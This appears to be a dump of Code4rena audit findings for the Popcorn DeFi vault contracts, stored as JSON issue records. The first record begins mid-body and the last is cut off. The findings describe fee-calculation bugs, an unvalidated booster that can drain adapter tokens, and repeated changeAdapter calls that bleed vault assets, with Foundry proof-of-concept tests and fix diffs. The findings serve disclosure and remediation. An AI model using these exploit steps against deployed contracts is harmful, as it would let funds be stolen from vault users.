https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/beefy/BeefyAdapter.sol#L156-L161   # Vulnerability details   By inspecting the [Beefy strategy contract](https://polygonscan.com/address/0xe8c3be24330dd1e0d4ce0d65d0c2721810692183#code#L1511) that is used in the `BeffyAdapter` we can see that the implementation for `BefftAdapter#previewWithdraw` is wrong  ## Impact `BeefyAdapter#previewWithdraw` returns wrong number of shares because it wrongly accounts for fees.  It wrongly uses the value `BPS_DENOMINATOR`. The correct usage is stated in the beefy docs :    https://docs.beefy.finance/developer-documentation/strategy-contract#withdrawal-fee  ## Proof of Concept  The wrong calculation is made here:  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/beefy/BeefyAdapter.sol#L156-L161  The following POC demonstrates the difference of fee calculation used for previewWithdraw  Create a new file inside `test/vault/integration/beefy/FeeCalculation.t.sol` : ```solidity // SPDX-License-Identifier: GPL-3.0 // Docgen-SOLC: 0.8.15  pragma solidity ^0.8.15;  import { Test } from \"forge-std/Test.sol\"; import { Math } from \"../../../../src/vault/adapter/beefy/BeefyAdapter.sol\";  contract BeefyFeeCalculation is Test {      using Math for uint256;     uint256 public constant BPS_DENOMINATOR = 10_000;       function calcImplemented(uint assets, uint beefyFee) public returns (uint) {         assets = assets.mulDiv(             BPS_DENOMINATOR,             BPS_DENOMINATOR - beefyFee,             Math.Rounding.Up         );          return assets;     }    function calcEtherscanOriginal(uint wantBal, uint withdrawalFee) public returns (uint) {     uint256 withdrawalFeeAmount = wantBal * withdrawalFee / BPS_DENOMINATOR;                 wantBal = wantBal - withdrawalFeeAmount;          return wantBal;   }    function testCalcFeeDifference() public {     uint asset = 1 ether;     uint beefyFee = 20;     uint impl = calcImplemented(asset, beefyFee);     uint orig = calcEtherscanOriginal(asset, beefyFee);      emit log_named_uint(\"Implemented\", impl);     emit log_named_uint(\"Original   \", orig);      assertEq(impl, orig);   } } ```  The output shows a big difference in calculation of withdrawal preview:  ```bash [FAIL. Reason: Assertion failed.] testCalcFeeDifference() (gas: 19566) Logs:   Implemented: 1002004008016032065   Original   : 998000000000000000   Error: a == b not satisfied [uint]     Expected: 998000000000000000       Actual: 1002004008016032065 ```   ## Tools Used Manual review  ## Recommended Mitigation Steps Correct the calculation to match the original withdraw logic:  ```diff     function previewWithdraw(uint256 assets)         public         view         override         returns (uint256)     {         IBeefyStrat strat = IBeefyStrat(beefyVault.strategy());         uint256 beefyFee = strat.withdrawalFee();   -        if (beefyFee > 0) -            assets = assets.mulDiv( -                BPS_DENOMINATOR, -                BPS_DENOMINATOR - beefyFee, -                Math.Rounding.Up -            ); + +        if (beefyFee > 0) { +          uint256 fee = assets.mulDiv(beefyFee, BPS_DENOMINATOR, Math.Rounding.Up); +          assets = assets - fee; +        }          return _convertToShares(assets, Math.Rounding.Up);     } ```"}, {"title": "cool down time period is not properly respected for the `harvest` method ", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/558", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-09"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L86 https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L438-L450   # Vulnerability details   Harvest method is called on every deposit or withdraw into the `Vault` which further calls into the provided strategy. This calling into strategy is limited by the cool down period. But in the current implementation is not properly respected.  ## Impact Setting the cool down period for a strategy harvest callback method is not working properly so that on every deposit/withdraw into `Vault` also the strategy is called every time.  ## Proof of Concept The main problem is that `lastHarvest` state variable is only set in the constructor   https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L86  and is not updated on strategy harvest method execution in the following lines:  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L438-L450  ## Tools Used Manual review  ## Recommended Mitigation Steps For the cool down period to work correctly update tha `lastHarvset` state variable like this:  ```diff     function harvest() public takeFees {         if (             address(strategy) != address(0) &&             ((lastHarvest + harvestCooldown) < block.timestamp)         ) { + +           lastHarvest = block.timestamp; +             // solhint-disable             address(strategy).delegatecall(                 abi.encodeWithSignature(\"harvest()\")             );         }          emit Harvested();     } ```"}, {"title": "`Vault.redeem` function does not use `syncFeeCheckpoint` modifier", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/557", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-10"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L253-L278 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L211-L240 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L496-L499 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L473-L477 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L480-L494 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L447-L460   # Vulnerability details  ## Impact The following `Vault.redeem` function does not use the `syncFeeCheckpoint` modifier, which is unlike the `Vault.withdraw` function below. Because of this, after calling the `Vault.redeem` function, `highWaterMark` is not sync'ed. In this case, calling functions like `Vault.takeManagementAndPerformanceFees` after the `Vault.redeem` function is called and before the `syncFeeCheckpoint` modifier is triggered will eventually use a stale `highWaterMark` to call the `Vault.accruedPerformanceFee` function. This will cause the performance fee to be calculated inaccurately in which the `feeRecipient` can receive more performance fee than it should receive or receive no performance fee when it should.  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L253-L278 ```solidity     function redeem(         uint256 shares,         address receiver,         address owner     ) public nonReentrant returns (uint256 assets) {         ...     } ```  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L211-L240 ```solidity     function withdraw(         uint256 assets,         address receiver,         address owner     ) public nonReentrant syncFeeCheckpoint returns (uint256 shares) {         ...     } ```  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L496-L499 ```solidity     modifier syncFeeCheckpoint() {         _;         highWaterMark = convertToAssets(1e18);     } ```  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L473-L477 ```solidity     function takeManagementAndPerformanceFees()         external         nonReentrant         takeFees     {} ```  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L480-L494 ```solidity     modifier takeFees() {         uint256 managementFee = accruedManagementFee();         uint256 totalFee = managementFee + accruedPerformanceFee();         uint256 currentAssets = totalAssets();         uint256 shareValue = convertToAssets(1e18);          if (shareValue > highWaterMark) highWaterMark = shareValue;          if (managementFee > 0) feesUpdatedAt = block.timestamp;          if (totalFee > 0 && currentAssets > 0)             _mint(feeRecipient, convertToShares(totalFee));          _;     } ```  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L447-L460 ```solidity     function accruedPerformanceFee() public view returns (uint256) {         uint256 highWaterMark_ = highWaterMark;         uint256 shareValue = convertToAssets(1e18);         uint256 performanceFee = fees.performance;          return             performanceFee > 0 && shareValue > highWaterMark                 ? performanceFee.mulDiv(                     (shareValue - highWaterMark) * totalSupply(),                     1e36,                     Math.Rounding.Down                 )                 : 0;     } ```   ## Proof of Concept The following steps can occur for the described scenario. 1. A user calls the `Vault.redeem` function, which does not sync `highWaterMark`. 2. The vault owner calls the `Vault.takeManagementAndPerformanceFees` function, which eventually calls the `accruedPerformanceFee` function. 3. When calling the `Vault.accruedPerformanceFee` function, because `convertToAssets(1e18)` is less than the stale `highWaterMark`, no performance fee is accrued. If calling the `Vault.redeem` function can sync `highWaterMark`, some performance fee would be accrued through using such updated `highWaterMark` but that is not the case here. 4. `feeRecipient` receives no performance fee when it should.  ## Tools Used VSCode  ## Recommended Mitigation Steps The `Vault.redeem` function can be updated to use the `syncFeeCheckpoint` modifier."}, {"title": "BeefyAdapter() malicious vault owner can use malicious _beefyBooster to steal the adapter's token", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/552", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-02"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/beefy/BeefyAdapter.sol#L61-L65   # Vulnerability details  ## Impact malicious vault owner can use Malicious _beefyBooster to steal the adapter's token  ## Proof of Concept  When creating a BeefyAdapter, the vault owner can specify the _beefyBooster The current implementation does not check if the _beefyBooster is legitimate or not, and worse, it _beefyVault.approve to the _beefyBooster during initialization The code is as follows:  ```solidity contract BeefyAdapter is AdapterBase, WithRewards { ...     function initialize(         bytes memory adapterInitData,         address registry,         bytes memory beefyInitData     ) external initializer {                 (address _beefyVault, address _beefyBooster) = abi.decode(             beefyInitData,   //@audit <--------- beefyInitData comes from the owner's input: adapterData.data             (address, address)         );           //@audit <-------- not check _beefyBooster is legal         if (             _beefyBooster != address(0) &&             IBeefyBooster(_beefyBooster).stakedToken() != _beefyVault           ) revert InvalidBeefyBooster(_beefyBooster);     ...                if (_beefyBooster != address(0))             IERC20(_beefyVault).approve(_beefyBooster, type(uint256).max);     //@audit <---------  _beefyVault approve _beefyBooster      }      function _protocolDeposit(uint256 amount, uint256)         internal         virtual         override     {         beefyVault.deposit(amount);         if (address(beefyBooster) != address(0))              beefyBooster.stake(beefyVault.balanceOf(address(this)));  //@audit <--------- A malicious beefyBooster can transfer the token     } ```  As a result, a malicious user can pass a malicious _beefyBooster contract, and when the user deposits to the vault, the vault is saved to the _beefyVault, This malicious _beefyBooster can execute _beefyVault.transferFrom(BeefyAdapter), and take all the tokens stored by the adapter to _beefyVault  ## Tools Used  ## Recommended Mitigation Steps  Check _beefyBooster just like check _beefyVault  ```solidity     function initialize(         bytes memory adapterInitData,         address registry,         bytes memory beefyInitData     ) external initializer { ...         if (!IPermissionRegistry(registry).endorsed(_beefyVault))             revert NotEndorsed(_beefyVault); ...             +       if (!IPermissionRegistry(registry).endorsed(_beefyBooster)) +           revert NotEndorsed(_beefyBooster);          if (             _beefyBooster != address(0) &&             IBeefyBooster(_beefyBooster).stakedToken() != _beefyVault         ) revert InvalidBeefyBooster(_beefyBooster); ```"}, {"title": "[NAZ-M2] Unchecked return of `execute()` ", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/541", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "selected for report", "sponsor confirmed", "M-11"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn//blob/main/src/vault/VaultController.sol#L238   # Vulnerability details  ## Impact Across the `VaultController.sol` there are many external calls to the `AdminProxy.sol` via `execute()`. Looking at the `execute()` function in `AdminProxy.sol`: ```solidity function execute(address target, bytes calldata callData)     external     onlyOwner      returns (bool success, bytes memory returndata)  {     return target.call(callData); } ``` As one can see it does a call to the target contract with the provided `callData`. Going back to the `VaultController.sol` the success of the call is check and reverts if unsuccessful. However, in one instance this check is missed and could cause issues.  ## Proof of Concept Looking at that specific instance: ```solidity function __deployAdapter(     DeploymentArgs memory adapterData,     bytes memory baseAdapterData,     IDeploymentController _deploymentController   ) internal returns (address adapter) {     (bool success, bytes memory returnData) = adminProxy.execute(       address(_deploymentController),       abi.encodeWithSelector(DEPLOY_SIG, ADAPTER, adapterData.id, _encodeAdapterData(adapterData, baseAdapterData))     );     if (!success) revert UnderlyingError(returnData);      adapter = abi.decode(returnData, (address));      adminProxy.execute(adapter, abi.encodeWithSelector(IAdapter.setPerformanceFee.selector, performanceFee));//@audit unchecked like the others are } ``` It is clear that the last call to `AdminProxy.sol`'s `execute` is not checked.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Consider adding a check similar to how it is done in the rest of the contract."}, {"title": "vault.changeAdapter can be misused to drain fees", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/515", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-13"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L594-L613   # Vulnerability details  ## Impact The vault owner has an option to change the adapter for the vault.  The normal mechanism to change adapter is that the change should first be proposed by the owner via `proposeAdapter` and after a `quitPeriod`, it can be set via a call to `changeAdapter`  After an owner has changes an adapter, any user is still able to call the `changeAdapter` function again. This will \"change\" the adapter to the same adapter, as `proposedAdapter` variable still has the same value as set by the owner.  This extra call will redeem all funds from the adapter, and deposit again to the same adapter. *When this adapter charges any fees, this will result in a direct loss of assets.*  For example Beefy finance has a default withdrawal fee of 0.1%.  When the adapter has been set to a new BeefyAdapter, calling `changeAdapter`, will do a `_protocolWithdraw` and `_protocolDeposit` to deposit/withdraw all assets on the beefyvault. This results in a net loss of 0.1% of those assets, which will go to the beefyVault. Repeatedly calling changeAdapter can cause a significant direct loss of user funds.  *note*:  calling `changeAdapter` before an owner has called `proposeAdapter` fails because `adapter.deposit` will revert when `adapter` is `address(0)`. But it is still recommended to better check if `proposeAdapter` has been called when `changeAdapter` is executed.  ## Proof of Concept To test the scenario, I have created a new Mock contract to simulate an adapter that charges fees. *test\\utils\\mocks\\MockERC4626WithFees.sol*      // SPDX-License-Identifier: AGPL-3.0-only     pragma solidity >=0.8.0;     import \"forge-std/console.sol\";     import {MockERC4626} from \"./MockERC4626.sol\";     import {MathUpgradeable as Math} from \"openzeppelin-contracts-upgradeable/utils/math/MathUpgradeable.sol\";     import { IERC4626, IERC20 } from \"../../../src/interfaces/vault/IERC4626.sol\";      contract MockERC4626WithFees is MockERC4626 {         using Math for uint256;         constructor(             IERC20 _asset,             string memory _name,             string memory _symbol         ) MockERC4626(_asset, _name, _symbol) {}           /// @notice `previewRedeem` that takes withdrawal fees into account         function previewRedeem(uint256 shares)             public             view             override             returns (uint256)         {             uint256 assets = convertToAssets(shares);             uint256 withdrawalFee = 10;             uint256 fee = assets.mulDiv(                 withdrawalFee,                 10_000,                 Math.Rounding.Up             );             assets -= fee;              return assets;         }          function beforeWithdraw(uint256 assets, uint256 shares) internal override {             MockERC4626.beforeWithdraw(assets,shares);             uint256 assetsWithoutFees = convertToAssets(shares);             uint256 fee = assetsWithoutFees - assets;             // in real adapters, withdrawal would cause _underlyingBalance to change              // here simulate that by burning asset tokens. same effect. holdings decrease by fee percent             asset.transfer(address(0xdead), fee);          }      }  first need to add the imports to *.\\test\\vault\\Vault.t.sol*  ```diff pragma solidity ^0.8.15;  +import \"forge-std/console.sol\";  import { Test } from \"forge-std/Test.sol\";  import { MockERC20 } from \"../utils/mocks/MockERC20.sol\";  import { MockERC4626 } from \"../utils/mocks/MockERC4626.sol\"; +import { MockERC4626WithFees } from \"../utils/mocks/MockERC4626WithFees.sol\";  import { Vault } from \"../../src/vault/Vault.sol\"; ```  and change the `test__changeAdapter` test in *.\\test\\vault\\Vault.t.sol* to test the impact of 10 calls to `changeAdapter`:  ```diff @@ -824,7 +826,7 @@ contract VaultTest is Test {     // Change Adapter    function test__changeAdapter() public { -    MockERC4626 newAdapter = new MockERC4626(IERC20(address(asset)), \"Mock Token Vault\", \"vwTKN\"); +    MockERC4626 newAdapter = new MockERC4626WithFees(IERC20(address(asset)), \"Mock Token Vault\", \"vwTKN\");      uint256 depositAmount = 1 ether;       // Deposit funds for testing @@ -858,6 +860,19 @@ contract VaultTest is Test {      assertEq(asset.allowance(address(vault), address(newAdapter)), type(uint256).max);       assertEq(vault.highWaterMark(), oldHWM); + +    console.log(asset.balanceOf(address(newAdapter)) ); +    console.log(newAdapter.balanceOf(address(vault)) ); + +    vm.startPrank(alice); +    uint256 rounds = 10; +    for (uint256 i = 0;i<rounds;i++){ +      vault.changeAdapter(); +    } + +    console.log(asset.balanceOf(address(newAdapter)) ); +    console.log(newAdapter.balanceOf(address(vault)) ); +    } ```  Runing this test, results in the vault/adapter assets to have decreased by about 1% (10 times 0.1%) The output:       Running 1 test for test/vault/Vault.t.sol:VaultTest     [PASS] test__changeAdapter() (gas: 2896175)     Logs:       2000000000000000000 <---- asset.balanceOf(address(newAdapter)       2000000000000000000 <---- newAdapter.balanceOf(address(vault)       1980089760419496416 <---- asset.balanceOf(address(newAdapter)       1980089760419496416 <---- newAdapter.balanceOf(address(vault)  ## Tools Used manual review, forge  ## Recommended Mitigation Steps implement better checks for `changeAdapter`. It is possible to add an `onlyOwner` modifier to this function. Other option is to check if `proposedAdapterTime` is set, and set `proposedAdapterTime` to 0 after `changeAdapter` has been called. This will allow only 1 call to `changeAdapter` for every `proposeAdapter` call."}, {"title": "Fee on transfer token not supported", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/503", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-14"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn//blob/main/src/utils/MultiRewardEscrow.sol#L100   # Vulnerability details  ## Impact If you are making a Lock fund for escrow using a fee on transfer token then contract will receive less amount (X-fees) but will record full amount (X). This becomes a problem as when claim is made then call will fail due to lack of funds. Worse, one user will unknowingly take the missing fees part from another user deposited escrow fund  ## Proof of Concept 1. User locks token X as escrow which take fee on transfer 2. For same, he uses `lock` function which transfer funds from user to contract  ```  function lock(     IERC20 token,     address account,     uint256 amount,     uint32 duration,     uint32 offset   ) external { ...  token.safeTransferFrom(msg.sender, address(this), amount); ... escrows[id] = Escrow({       token: token,       start: start,       end: start + duration,       lastUpdateTime: start,       initialBalance: amount,       balance: amount,       account: account     }); ... } ```  3. Since token has fee on transfer so contract receives only `amount-fees` but the escrow object is created for full `amount`  4. Lets say escrow duration is over and claim is made using `claimRewards` function  ``` function claimRewards(bytes32[] memory escrowIds) external { ...  uint256 claimable = _getClaimableAmount(escrow); ...      escrow.token.safeTransfer(escrow.account, claimable); ... } ```  5. Since full duration is over so claimable amount is `amount`. But this fails on transfer to account since contract has only `amount-fees`  ## Recommended Mitigation Steps Compute the balance before and after transfer and subtract them to get the real amount. Also use nonReentrant while using this to prevent from reentrancy in ERC777 tokens"}, {"title": "[H-01] Management Fee for a vault is charged even when there is no assets under management and subject to manipulation.", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/499", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-15"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L429-L439 https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L473 https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L481   # Vulnerability details  `managementFee` is calculated by `accruedManagementFee` function:      - managementFee x (totalAssets x (block.timestamp - feesUpdatedAt))/SECONDS_PER_YEAR https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L429-L439  ## Impact 1  Management Fee for a vault is charged even when there is no assets under management.  The `feesUpdatedAt` variable is first assigned at block.timestamp when the vault is initialized: https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L87  The vault could be deployed and initialized without any asset under management at time T. For example 10 years after deployment, a user Alice deposits 100ETH into the vault, the management fee will be calculated from T to block.timestamp (which is 10 years) which is not fair. Alice will be charged immediately all majority of 100ETH as management fee. Further than that, if the totalAssets after a year is significant large, the management fee will be highly overcharged for the last year when no fund was managed.  The vault owner could create vaults, wait for a period of time and trap user to deposit. He then could immediately get user assets by claim the wrongful managemennt fee.  ## Proof of Concept  <!-- Put the POC in: test/vault/Vault.t.sol -->       function test__managementFeeOvercharge() public {         // Set fee         _setFees(0, 0, 1e17, 0);          // 10 years passed         uint256 timestamp = block.timestamp + 315576000; // 10 years         vm.warp(timestamp);          // Alice deposit 100 ether to the vault         uint256 depositAmount = 100 ether;         asset.mint(alice, depositAmount);         vm.startPrank(alice);         asset.approve(address(vault), depositAmount);         vault.deposit(depositAmount, alice);         vm.stopPrank();          // 1 second pass         uint256 timestamp1 = block.timestamp + 1;         vm.warp(timestamp1);          uint256 expectedFeeInAsset = vault.accruedManagementFee();         uint256 expectedFeeInShares = vault.convertToShares(expectedFeeInAsset);                  // Vault creator call takeManagementAndPerformanceFees to take the management fee         vault.takeManagementAndPerformanceFees();         console.log(\"Total Supply: \", vault.totalSupply());         console.log(\"Balance of feeRecipient: \", vault.balanceOf(feeRecipient));                   assertEq(vault.totalSupply(), depositAmount + expectedFeeInShares);         assertEq(vault.balanceOf(feeRecipient), expectedFeeInShares);          // FeeReccipient withdraw the tokens         vm.startPrank(feeRecipient);         vault.redeem(vault.balanceOf(feeRecipient), feeRecipient, feeRecipient);         // 50 ETH is withdrawn to feeRecipient         console.log(\"Asset balance of feeRecipient: \", asset.balanceOf(feeRecipient));         console.log(\"Vault total assets: \", vault.totalAssets());     }  ## Impact 2  Management Fee is subject to manipulation because of `feesUpdatedAt` and `totalAssets` are varied by user or vault owner's actions To get the management fee will be lower.  - A user who wants to deposit large amount of assets to the vault, he will tend to call `takeManagementAndPerformanceFees` to reset the variable `feesUpdatedAt` to block.timestamp before deposit.  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L473 - A user who want to withdraw will withdraw before the call of `takeManagementAndPerformanceFees` function.  Vault owner will have the incentive to front run a large withdraw of assets and call `takeManagementAndPerformanceFees` to get higher management fee because `totalAssets()` is still high.  ## Proof of Concept  Alice deposit 1000 ETH into the vault. The vault deposit, withdraw and management fees are set to 1e17.   In the first scenario, before Alice can withdraw, vault creator front-run to call the `takeManagementAndPerformanceFees ` function. Result is that feeReceipient will have 192.21 ETH.  <!-- Put the POC in: test/vault/Vault.t.sol -->      function test__managementFeeFrontRun() public {         _setFees(1e17, 1e17, 1e17, 0);          // Alice deposit 1000 ether to the vault         uint256 depositAmount = 1000 ether;         asset.mint(alice, depositAmount);         vm.startPrank(alice);         asset.approve(address(vault), depositAmount);         vault.deposit(depositAmount, alice);         vm.stopPrank();          // 7 days pass and Alice want to withdraw her ETH from vault         uint256 timestamp = block.timestamp + 604800;         vm.warp(timestamp);          // Vault creator call takeManagementAndPerformanceFees to take the management fee          vault.takeManagementAndPerformanceFees();          // Alice withdraw her ETH         vm.startPrank(alice);         vault.redeem(vault.balanceOf(alice), alice, alice);          uint256 feeInAssetIfFrontRun = vault.convertToAssets(vault.balanceOf(feeRecipient));         console.log(\"feeInAssetIfFrontRun: \", feeInAssetIfFrontRun); // feeReceipient will have 192.21 ETH     }  In the second scenario, no front-run to call the `takeManagementAndPerformanceFees ` function happens. Result is that feeReceipient will have 190 ETH  <!-- Put the POC in: test/vault/Vault.t.sol -->      function test__managementFeeNoFrontRun() public {         _setFees(1e17, 1e17, 1e17, 0);          // Alice deposit 1000 ether to the vault         uint256 depositAmount = 1000 ether;         asset.mint(alice, depositAmount);         vm.startPrank(alice);         asset.approve(address(vault), depositAmount);         vault.deposit(depositAmount, alice);         vm.stopPrank();          // 7 days pass and Alice want to withdraw her ETH from vault         uint256 timestamp = block.timestamp + 604800;         vm.warp(timestamp);          // Alice withdraw her ETH         vm.startPrank(alice);         vault.redeem(vault.balanceOf(alice), alice, alice);          // Vault creator call takeManagementAndPerformanceFees to take the management fee          vault.takeManagementAndPerformanceFees();          uint256 feeInAssetIfNoFrontRun = vault.convertToAssets(vault.balanceOf(feeRecipient));         console.log(\"feeInAssetIfNoFrontRun: \", feeInAssetIfNoFrontRun); // feeReceipient will have 190 ETH     }  ## Tools Used - Manual  ## Recommended Mitigation Steps:   `feesUpdatedAt` variable is not updated frequently enough. They are only updated when calling `takeManagementAndPerformanceFees` and `changeAdapter`. The fee should be calculated and took more frequently in each deposit and withdrawal of assets."}, {"title": "The calculation of ````takeFees```` in ````Vault```` contract is incorrect", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/491", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-16"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L480-L494   # Vulnerability details  ## Impact The calculation of ````takeFees```` in ````Vault```` contract is incorrect, which will cause fee charged less than expected.  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L480-L494  ## Proof of Concept To simplify the problem, let's given the fee parameters are as follows ```solidity // Fees are set in 1e18 for 100% (1 BPS = 1e14) struct VaultFees {     uint64 deposit; // 0     uint64 withdrawal; // 0     uint64 management; // 0.5e18 = 50%     uint64 performance; // 0 } ``` And the initial asset token and share tokens in the vault are ```solidity totalAsset = 100 $AST totalShare = 100 $SHR yieldEarnings = 0 $AST ``` The yield earnings is also set to 0. As the yearly management fee is 50%, so the expected fee for one year is ```solidity feeInAsset = 100 $AST * 0.5 = 50 $AST ```  Now let's calculate the actual fee. The implementation of ````accruedManagementFee()```` is ```solidity     function accruedManagementFee() public view returns (uint256) {         uint256 managementFee = fees.management;         return             managementFee > 0                 ? managementFee.mulDiv(                     totalAssets() * (block.timestamp - feesUpdatedAt),                     SECONDS_PER_YEAR,                     Math.Rounding.Down                 ) / 1e18                 : 0;     } ``` So in this case, one year later, the calculation of first step for ````managementFee ```` will be ```solidity managementFee = 0.5e18 * 100 $AST  * SECONDS_PER_YEAR / SECONDS_PER_YEAR  / 1e18 = 50 $AST ``` The implementation of ````takeFees()```` is ```solidity     modifier takeFees() {         uint256 managementFee = accruedManagementFee();         uint256 totalFee = managementFee + accruedPerformanceFee();         uint256 currentAssets = totalAssets();         uint256 shareValue = convertToAssets(1e18);          if (shareValue > highWaterMark) highWaterMark = shareValue;          if (managementFee > 0) feesUpdatedAt = block.timestamp;          if (totalFee > 0 && currentAssets > 0)             _mint(feeRecipient, convertToShares(totalFee)); // @audit L491          _;     } ``` So, variables before L491 of ````takeFees()```` will be ```solidity managementFee = 50 $AST totalFee  = 50 $AST + 0 = 50 $AST currentAssets  = 100 $AST ``` As the implementation of ````convertToShares()```` is ```solidity     function convertToShares(uint256 assets) public view returns (uint256) {         uint256 supply = totalSupply();          return             supply == 0                 ? assets                 : assets.mulDiv(supply, totalAssets(), Math.Rounding.Down);     } ``` So the the second parameter for ````_mint()```` call at L491 is ```solidity feeInShare = convertToShares(totalFee) = convertToShares(50 $AST) = 50 $AST * 100 $SHR / 100 $AST = 50 $SHR ``` After ````_mint()```` at L491, the variables will be ```solidity shareOfUser = 100 $SHR shareOfFeeRecipient = 50 $SHR totalShare = 100 + 50  = 150 $SHR totalAsset = 100 $AST ```  The implementation of ````convertToAssets()```` is ```solidity     function convertToAssets(uint256 shares) public view returns (uint256) {         uint256 supply = totalSupply();           return             supply == 0                 ? shares                 : shares.mulDiv(totalAssets(), supply, Math.Rounding.Down);     } ``` Now we can get actual fee by calling ````convertToAsset()````, which is ```solidity actualFeeInAsset = convertToAsset(feeInShare) = convertToAsset(50 $SHR) = 50 $SHR * 100 $AST / 150 $SHR = 33.3 $AST ```  We can see the actual fee is less than expected, the realistic parameters will be less than the give 0.5e18, but it will be always true that the actual fee charged is not enough.  ## Tools Used VS Code  ## Recommended Mitigation Steps Use the correct formula such as ```diff     modifier takeFees() {         uint256 managementFee = accruedManagementFee();         uint256 totalFee = managementFee + accruedPerformanceFee();         uint256 currentAssets = totalAssets();         uint256 shareValue = convertToAssets(1e18);          if (shareValue > highWaterMark) highWaterMark = shareValue;          if (managementFee > 0) feesUpdatedAt = block.timestamp;  -       if (totalFee > 0 && currentAssets > 0) -           _mint(feeRecipient, convertToShares(totalFee)); +       if (totalFee > 0 && currentAssets > 0) { +           uint256 supply = totalSupply(); +           uint256 feeInShare = supply == 0 +               ? totalFee +               : totalFee.mulDiv(supply, currentAssets - totalFee, Math.Rounding.Down); +           _mint(feeRecipient, feeInShare); +       }          _;     } ```"}, {"title": "Malicious Users Can Drain The Assets Of Vault. (Due to not being ERC4626 Complaint)", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/471", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-17"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L294   # Vulnerability details  ### Impact  Malicious users can drain the assets of the vault.  ### POC  The `withdraw` function users `convertToShares` to convert the assets to the amount of shares. These shares are burned from the users account and the assets are returned to the user.  The function `withdraw` is shown below:  ```solidity function withdraw(         uint256 assets,         address receiver,         address owner     ) public nonReentrant syncFeeCheckpoint returns (uint256 shares) {         if (receiver == address(0)) revert InvalidReceiver();          shares = convertToShares(assets); /// .... [skipped the code] ```  The function `convertToShares` is shown below:  ```solidity function convertToShares(uint256 assets) public view returns (uint256) {         uint256 supply = totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.          return             supply == 0                 ? assets                 : assets.mulDiv(supply, totalAssets(), Math.Rounding.Down);     } ```  